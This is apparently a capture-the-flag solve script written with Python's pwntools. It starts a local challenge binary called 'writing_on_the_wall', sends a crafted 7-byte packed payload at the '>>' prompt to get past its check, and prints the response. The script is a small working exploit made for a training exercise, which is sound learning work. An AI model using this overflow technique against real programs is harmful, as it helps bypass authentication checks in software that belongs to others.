from pwn import *

io = process("./writing_on_the_wall")

payload = p64(0x2073736170743377)[:7]

io.sendlineafter('>> ', payload)

print(io.recvline().decode())

io.close()


